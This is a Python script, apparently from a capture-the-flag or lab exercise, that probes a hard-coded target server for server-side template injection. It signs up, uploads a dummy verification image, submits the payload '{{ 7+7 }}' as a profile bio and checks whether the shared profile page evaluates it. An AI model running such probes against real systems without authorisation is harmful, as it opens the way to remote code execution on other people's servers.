#!/usr/bin/env python3
import requests
from PIL import Image
import io
import re

BASE_URL = "http://94.237.56.175:48466"

session = requests.Session()

# Sign up and login
signup_data = {'email': 'debug1@test.com', 'username': 'debug1', 'password': 'password123'}
session.post(f"{BASE_URL}/signup", data=signup_data)

login_data = {'username': 'debug1', 'password': 'password123'}
session.post(f"{BASE_URL}/login", data=login_data)

# Upload verification image
img = Image.new('RGB', (100, 100), color='red')
img_buffer = io.BytesIO()
img.save(img_buffer, format='JPEG')
img_buffer.seek(0)

files = {'file': ('badge.jpg', img_buffer, 'image/jpeg')}
session.post(f"{BASE_URL}/verification", files=files)

# Test with simple payload
payload = "{{ 7+7 }}"
print(f"Testing payload: {payload}")

bio_data = {'bio': payload}
r = session.post(f"{BASE_URL}/profile", data=bio_data)

# Access share profile
r = session.get(f"{BASE_URL}/user/debug1")

print("\n" + "="*80)
print("FULL RESPONSE:")
print("="*80)
print(r.text)
print("="*80)

# Extract just the bio section
match = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
if match:
    print(f"\nExtracted bio content: '{match.group(1)}'")
else:
    print("\nCould not extract bio content")
